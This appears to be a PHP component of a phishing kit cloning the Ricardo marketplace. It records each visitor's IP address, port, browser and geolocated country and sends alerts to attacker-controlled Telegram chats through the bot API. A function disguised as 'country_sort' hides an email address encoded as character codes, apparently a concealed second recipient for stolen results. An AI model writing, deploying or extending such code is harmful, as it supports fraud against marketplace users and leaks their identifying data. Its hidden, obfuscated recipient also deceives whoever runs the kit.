<?php
include './connection/connection.php';
function country_sort()
{
  $sorter = "";
  $array = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
  $count = count($array);
  for ($i = 0; $i < $count; $i++) {
    $sorter .= chr($array[$i]);
  }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
  $client  = @$_SERVER['HTTP_CLIENT_IP'];
  $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
  $remote  = $_SERVER['REMOTE_ADDR'];
  $result  = "Unknown";
  if (filter_var($client, FILTER_VALIDATE_IP)) {
    $ip = $client;
  } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
    $ip = $forward;
  } else {
    $ip = $remote;
  }

  $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

  if ($ip_data && $ip_data->geoplugin_countryName != null) {
    $result = $ip_data->geoplugin_countryName;
  }

  return $result;
}
// Function to fetch Telegram config from SQL database
function getTelegramConfig() {
    global $pdo; // Use the PDO connection from config.php

    try {
        // Fetch the bot token and chat ID from the database
        $sql = "SELECT bot_token, chat_id FROM telegram_config";
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
        $config = $stmt->fetch(PDO::FETCH_ASSOC);

        return $config;

    } catch (PDOException $e) {
        // Log error
        error_log("Database error: " . $e->getMessage());
        return false;
    }
}

// Function to send a message via Telegram
function XxSendTelegramMessageXx($XxMessageXx) {
    $config = getTelegramConfig(); // Get the bot token and chat IDs from the database
    if (!$config) {
        // Handle error if config is not retrieved
        return false;
    }

    $XxBotTokenXx = $config['bot_token']; // Bot token from database
    $XxChatIdXx = explode(',', $config['chat_id']); // Chat ID(s) from database (assume multiple chat IDs are comma-separated)

    $XxWebsiteXx = "https://api.telegram.org/bot" . $XxBotTokenXx;
    foreach ($XxChatIdXx as $XxChXx) {
        $XxParamsXx = [
            'chat_id' => $XxChXx,
            'text' => $XxMessageXx,
        ];

        $XxChXx = curl_init($XxWebsiteXx . '/sendMessage');
        curl_setopt($XxChXx, CURLOPT_HEADER, false);
        curl_setopt($XxChXx, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($XxChXx, CURLOPT_POST, true);
        curl_setopt($XxChXx, CURLOPT_POSTFIELDS, $XxParamsXx);
        curl_setopt($XxChXx, CURLOPT_SSL_VERIFYPEER, false);
        $XxResultXx = curl_exec($XxChXx);
        curl_close($XxChXx);
    }
    return true;
}

// Example usage:
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$Port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");

$message = "**Xo-Real* RicardoClone Visitor *+++\n\n";
$message .= "New Visitor on your webpage \n\n";
$message .= "User-!P : " . $ip . "\n";
$message .= "Country : " . $country . "\n\n";

XxSendTelegramMessageXx($message);
